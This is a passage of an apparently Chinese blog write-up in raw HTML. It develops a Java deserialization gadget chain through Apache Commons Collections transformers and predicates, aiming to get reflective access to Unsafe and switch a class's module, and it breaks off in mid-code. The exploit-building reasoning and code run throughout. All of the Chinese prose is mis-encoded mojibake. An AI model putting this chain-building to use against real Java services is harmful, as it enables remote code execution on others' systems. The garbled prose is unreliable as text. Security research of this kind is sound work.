</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æˆ‘ä»¬åŒ–ç®€ï¼Œä¹Ÿå°±æ˜¯è¦æ‰§è¡Œ<code>unsafe.getAndSetObject(currentClass,addr,ObjectModule);</code>è¿™å¥ä»£ç </p>
<p>é‚£å°±è¦å¥½å¥½ç†è§£<code>invokerTransformer.transform</code>ä¸­çš„é€»è¾‘äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="c1">//åŒ–ç®€ä¸‹</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="n">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="n">iParamTypes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">O</span><span class="p">)</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">iArgs</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><h4 id="å°è¯•"><strong>å°è¯•</strong><a hidden class="anchor" aria-hidden="true" href="#å°è¯•">#</a></h4>
<ol>
<li>é‚£æˆ‘ä»¬èƒ½ä¸èƒ½ç›´æ¥<code>ä¼ ä¸ªUnsafeå¯¹è±¡</code>å‘¢ï¼Ÿno</li>
</ol>
<p>Unsafeä¸èƒ½ååºåˆ—åŒ–</p>
<ol start="2">
<li>åé¢æƒ³åˆ°<code>getRuntime</code>,ç„¶åå»çœ‹å‘ç°æœ‰<code>getUnsafe</code>å¯ä»¥è·å¾—Unsafeå¯¹è±¡</li>
</ol>
<blockquote>
<p>ä½†æ˜¯å…¶å®ç”¨ä¸äº†hhhï¼Œä¸ç„¶å¹²å˜›è¿˜é€šè¿‡åå°„è·å¾—Unsafeå¯¹è±¡å˜›hhhã€‚è¯¥æ–¹æ³•è¿˜æœ‰<code>@CallerSensitive</code>è¿™ä¸ªæ³¨é‡Šä¼šå¯¹è°ƒç”¨è€…çš„<code>classLoader</code>è¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­å½“å‰ç±»æ˜¯å¦ç”±<code>Bootstrap classLoader</code>åŠ è½½ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±ä¼šæŠ›å‡ºä¸€ä¸ª<code>SecurityException</code>å¼‚å¸¸ã€‚</p>
</blockquote>
<ol start="3">
<li>å› ä¸ºå—åˆ°Runtimeçš„æ„é€ å’Œ<code>final Class&lt;?&gt; cls = input.getClass();</code>è¿™å¥ä»£ç çš„å½±å“ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¦å¾—åˆ°Unsafeå¯¹è±¡æ‰èƒ½è¿›è¡Œè°ƒç”¨ã€‚å› ä¸ºä½ ä¼ å…¥çš„<code>Unsafe.class</code>ç»è¿‡<code>input.getClass()</code>ï¼Œéƒ½ä¼šå˜æˆ<code>Class.class</code>ï¼Œä¼šæ²¡æœ‰ç”¨çš„ã€‚æˆ‘æ˜¨å¤©è¿™é‡Œä¸€åº¦ä»¥ä¸ºæ— è§£äº†hhh</li>
</ol>
<p>åé¢æˆ‘ä¸€ç›´çœ‹ä»£ç ï¼Œå‘ç°getRuntimeè´¹é‚£ä¹ˆå¤§åŠ²æ˜¯å› ä¸º<code>Class</code>æ²¡è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æœ‰<code>getDeclaredField</code>ï¼Œ<code>setAccessible</code>è¿™äº›æ–¹æ³•ã€‚è€ŒRuntimeå¯¹è±¡ä¹Ÿæ˜¯ä¸ºäº†execçš„è°ƒç”¨ï¼Œå¹¶ä¸æ˜¯å‰é¢å°±è¦æœ‰å¯¹è±¡æ‰èƒ½è°ƒç”¨ã€‚è€Œä¸”å‰é¢è°ƒç”¨(<code>Field unsafeField = UnsafeClass.getDeclaredField(&quot;theUnsafe&quot;);</code>)æœ¬æ¥å°±æ˜¯é€šè¿‡<code>Unsafe.class</code>è°ƒç”¨çš„ï¼Œè€Œä¸æ˜¯Unsafeå¯¹è±¡è°ƒç”¨çš„ï¼Œæ€ä¹ˆå°±ä¸èƒ½è°ƒç”¨äº†ï¼Ÿ</p>
<ol start="4">
<li>è¿™ä¸ªæƒ³æ³•é€šå°è¯•å‘ç°æ˜¯å¯ä»¥ï¼Œä½†æ˜¯åˆæœ‰ä¸ªé—®é¢˜</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><code>theUnsafe</code>æ˜¯<code>private</code>ï¼Œ<strong>setAccessible</strong>è¿™ä¸ªè°ƒç”¨ä¸èƒ½å°‘ï¼Œå°±æ„å‘³ç€<code>unsafeField</code>è¿™ä¸ªFiledå¯¹è±¡å¾—<code>è¢«è°ƒç”¨ä¸¤æ¬¡</code>ï¼Œä½†æ˜¯è¿™åœ¨<code>invokerTransformer</code>ä¸­æ€ä¹ˆå¯èƒ½å®ç°å‘¢ï¼Ÿäºæ˜¯æˆ‘æƒ³äº†èƒ½ä¸èƒ½åœ¨å¤–é¢æ‰§è¡Œ<code>unsafeField.setAccessible(true);</code>ï¼Œç„¶åæŠŠ<code>unsafeField</code>ä¼ åˆ°<code>invokerTransformer</code>ä¸­ï¼Œå…¶å®ä¸è¡Œ<code>Field</code>ä¹Ÿä¸ç»§æ‰¿<code>Serializable</code>å•Šï¼Œæƒ³påƒå‘¢hhh</p>
<h4 id="è§£å†³"><strong>è§£å†³</strong><a hidden class="anchor" aria-hidden="true" href="#è§£å†³">#</a></h4>
<p>ç„¶ååˆæ€è€ƒäº†ç‰‡åˆ»ï¼Œå¦‚æœé é“¾å­è§£å†³çš„è¯ï¼Œé‚£å¤§æ¦‚éœ€è¦ä¸€ä¸ªè¿™æ ·çš„ç»“æ„å§</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œ<code>iTransformer.transform(input);</code>å»æ‰§è¡Œ<code>unsafeField.setAccessible(true);</code>è¿™æ®µå†…å®¹ï¼Œæ‰§è¡Œå®Œåè¿˜èƒ½è¿”å›ä¹‹å‰çš„å¯¹è±¡ï¼Œåé¢æ­£å¸¸è°ƒç”¨ã€‚è¿™æ ·å¤§æ¦‚å°±èƒ½<code>å®ç°åŒä¸€ä¸ªå¯¹è±¡è¢«è°ƒç”¨2æ¬¡äº†ï¼</code></p>
<p>ç„¶åæˆ‘å°±å»æ‰¾å®ç°<code>transform</code>æ–¹æ³•çš„ç±»ï¼Œå…¶å®ä¸å¤šï¼Œä½†æ˜¯æ‰¾ä¸‹æ¥åŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆåŠç”¨ï¼Ÿä½†æ˜¯æ³¨æ„åˆ°æœ‰ä¸€äº›ç±»æœ‰<code>execute</code>ï¼Œ<code>evaluate</code>æ–¹æ³•ï¼Œä½†æ˜¯å®ç°<code>transform</code>æ–¹æ³•çš„ç±»é‡Œé¢åˆæ²¡çœ‹åˆ°é‚£ä¸ªå¯¹è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•è¿›è¡Œäº†è°ƒç”¨ã€‚è¿™é‡Œç¨å¾®æœ‰ç‚¹è¹Šè··äº†ï¼Œç„¶ååˆå»ç½‘ä¸Šæ‰¾äº†ä¸‹æ€è·¯ï¼Œå°±çœ‹åˆ°ä¹‹å‰CCæ”¹ç¼–çš„ä¸€äº›é“¾å­ã€‚ç„¶åçœ‹åˆ°ä¸€ä¸ªå¯¹<code>create()</code>æ–¹æ³•çš„è°ƒç”¨ï¼Œç„¶åè¿™ä¸ªç±»å…¶å®æ²¡å®ç°transformï¼Œä½†æ˜¯ä»–æœ‰<code>create()</code>ã€‚è¿™é‡Œæˆ‘ä¹Ÿæœ‰ç‚¹æ„Ÿè§‰äº†é‚£<code>execute</code>ï¼Œ<code>evaluate</code>æ–¹æ³•ä¹Ÿå¾ˆæœ‰å¯èƒ½æ˜¯æƒ³ç”¨ä¸€ä¸ªåŒ…ä¸‹çš„ç±»ï¼Œäºæ˜¯æˆ‘å°±å»è¿™ä¸ªåŒ…ä¸‹é¢ä¸€é€šæ‰¾ï¼Œhhhå¦‚æœè®©æˆ‘å‘ç°äº†ç‚¹ä»€ä¹ˆhhh</p>
<p><img loading="lazy" src="../images/image-20250110192555928.png" alt="image-20250110192555928"  />
</p>
<p>æˆ‘ä¹‹æ‰€ä»¥ä¼šæœ‰ä¸Šé¢è¿™ä¸ªæƒ³æ³•ï¼Œä¹Ÿæ˜¯æ‰¾<code>transform()</code>æ–¹æ³•çš„æ—¶å€™ï¼Œçœ‹åˆ°ä¸‹é¢è¿™ä¸¤ä¸ªè°ƒç”¨ï¼Œå°±å¾ˆç¬¦åˆæˆ‘çš„æ€è·¯ï¼ˆ<code>çœ‹ä»£ç æ³¨é‡Šï¼</code>ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ClosureTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iClosure</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">     </span><span class="c1">//åªè¦executeä¸­å¯ä»¥æ§åˆ¶è°ƒç”¨transformï¼Œå³å¯</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">IfTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iPredicate</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iTrueTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">iFalseTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//å› ä¸ºè¿™é‡Œæ˜¯ä¸‰å…ƒè¡¨è¾¾å¼ï¼Œæ‰€ä»¥å…¶å®ä¼šæ‰§è¡Œä¸¤å¥ä»£ç </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//æ‰€ä»¥è¿™é‡Œ evaluate(input) å¯ä»¥æ§åˆ¶è°ƒç”¨transformï¼Œå³å¯</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åå…¶å®æ„Ÿè§‰æ‰¾åˆ°äº†å¾ˆå¤šå¯ä»¥ç”¨çš„ã€‚å…ˆå†™æ¯”è¾ƒéº»çƒ¦çš„å§ï¼Œå› ä¸ºå¥½ç”¨çš„éƒ½æ˜¯åé¢æ‰é‡åˆ°wwww(è°ƒç”¨æƒ³æ³•å°±å†™åˆ°ä»£ç æ³¨é‡Šé‡Œå§æ–¹ä¾¿ç‚¹</p>
<h5 id="æ‰¾åˆ°çš„ä¸€äº›ç±»">æ‰¾åˆ°çš„ä¸€äº›ç±»<a hidden class="anchor" aria-hidden="true" href="#æ‰¾åˆ°çš„ä¸€äº›ç±»">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ComparatorPredicate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">boolean</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparator</span><span class="p">.</span><span class="na">compare</span><span class="p">(</span><span class="n">object</span><span class="p">,</span><span class="w"> </span><span class="n">target</span><span class="p">);</span><span class="c1">//è¿™é‡Œæ˜¯çœ‹åˆ°äº†compareï¼Œç„¶åCC4è¿™æ¡é“¾å­ä¹Ÿæ˜¯æœ‰è¿™ä¸ªè°ƒç”¨ç‚¹ï¼Œç„¶åæƒ³èƒ½ä¸èƒ½é€šè¿‡è¿™é‡Œè°ƒç”¨åˆ°transformï¼Œçœ‹äº†ä¸‹compare()ç›¸å…³ä»£ç æ„Ÿè§‰æ˜¯å¯è¡Œçš„ä½†æ˜¯æœ‰ç‚¹éº»çƒ¦</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">criterion</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">EQUAL</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">GREATER</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">LESS</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">GREATER_OR_EQUAL</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="n">LESS_OR_EQUAL</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">default</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;The current criterion &#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">criterion</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&#39; is invalid.&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">EqualPredicate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">equator</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">equator</span><span class="p">.</span><span class="na">equate</span><span class="p">(</span><span class="n">iValue</span><span class="p">,</span><span class="w"> </span><span class="n">object</span><span class="p">);</span><span class="w"> </span><span class="c1">//è¿™ä¸ªæ˜¯æƒ³åˆ°equateï¼Œequalsä¹Ÿæœ‰ç›¸å…³çš„é“¾å­ï¼Œè¿™ä¸ªæœªè¯å®ï¼Œæ„Ÿè§‰æœ‰å°±è®°å½•äº†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">iValue</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h5 id="æ¯”è¾ƒå¥½ç”¨çš„">æ¯”è¾ƒå¥½ç”¨çš„<a hidden class="anchor" aria-hidden="true" href="#æ¯”è¾ƒå¥½ç”¨çš„">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformerPredicate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">Boolean</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="c1">//è¿™ä¸ªéœ€è¦æœ‰ç»“æœï¼Œä½†æ˜¯setAccessibleè¿”å›æ˜¯voidï¼Œæ‰€ä»¥è¿™ä¸ªå¯èƒ½ç”¨ä¸äº†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">result</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FunctorException</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;Transformer must return an instanceof Boolean, it was a null object&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">booleanValue</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>å¥½ç”¨çš„</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformedPredicate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">object</span><span class="p">);</span><span class="w"> </span><span class="c1">//è¿™é‡Œä¸å°±å®Œç¾äº†ä¹ˆhhh</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iPredicate</span><span class="p">.</span><span class="na">evaluate</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TruePredicate</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">evaluate</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">object</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">    </span><span class="c1">//è¿™ä¸ªæ§åˆ¶ä¸‹iPredicate.evaluate(result);ç»“æœï¼Œå¢åŠ é“¾å­ç¨³å®šæ€§</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>æœ€å¥½ç”¨çš„</strong></p>
<p>è¿™ä¸ªæ˜¯æˆ‘å”¯ä¸€è®°å½•çš„ä¸€ä¸ª<code>execute</code>æ–¹æ³•çš„ï¼Œä½†ç¡®å®æœ€å¥½ç”¨çš„wwwï¼Œä¸æ˜¯å“¥ä»¬ï¼Ÿä½ ç›´æ¥å°±æ˜¯<code>æ¢¦ä¸­æƒ…execute</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">TransformerClosure</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">E</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h5 id="demo">demo<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h5>
<p>é‚£ä¹ˆæˆ‘æœ€åé€‰æ‹©äº†è¿™å¥—ç»„åˆ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ClosureTransformer</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">iClosure</span><span class="p">.</span><span class="na">execute</span><span class="p">(</span><span class="n">input</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">input</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	
